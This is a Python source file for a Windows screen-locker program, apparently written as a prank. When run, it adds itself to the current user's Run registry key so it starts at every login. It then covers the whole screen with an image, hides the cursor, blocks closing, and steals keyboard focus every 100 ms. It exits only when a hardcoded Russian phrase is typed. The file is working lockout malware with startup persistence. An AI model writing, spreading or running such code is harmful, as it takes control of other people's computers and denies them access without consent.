import tkinter as tk
from PIL import Image, ImageTk
import os
import sys
import winreg as reg

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

IMG_PATH = resource_path("рыбка.jpeg")
SECRET_PHRASE = "яникогданепотрогаютраву"

def add_to_startup():
    try:
        pth = os.path.realpath(sys.executable)
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "ларп", 0, reg.REG_SZ, pth)
        reg.CloseKey(open_key)
    except:
        pass

def remove_from_startup():
    try:
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.DeleteValue(open_key, "ларп")
        reg.CloseKey(open_key)
    except:
        pass

class openbsdeatyoupc:
    def __init__(self):
        self.root = tk.Tk()
        self.typed = ""
        add_to_startup()
        self.setup_window()
        self.load_image()
        self.setup_security()
        self.root.bind("<Key>", self.check_key)
        self.root.mainloop()

    def setup_window(self):
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.config(cursor="none")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

    def load_image(self):
        if os.path.exists(IMG_PATH):
            img = Image.open(IMG_PATH)
            sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
            img = img.resize((sw, sh))
            self.photo = ImageTk.PhotoImage(img)
            label = tk.Label(self.root, image=self.photo, bg="black")
            label.pack()

    def setup_security(self):
        def force_focus():
            self.root.focus_force()
            self.root.after(100, force_focus)
        force_focus()

    def check_key(self, event):
        char = event.char.lower()
        if char:
            self.typed += char
            if SECRET_PHRASE.startswith(self.typed):
                if self.typed == SECRET_PHRASE:
                    remove_from_startup()
                    self.root.destroy()
            else:
                self.typed = ""

if __name__ == "__main__":
    openbsdeatyoupc()
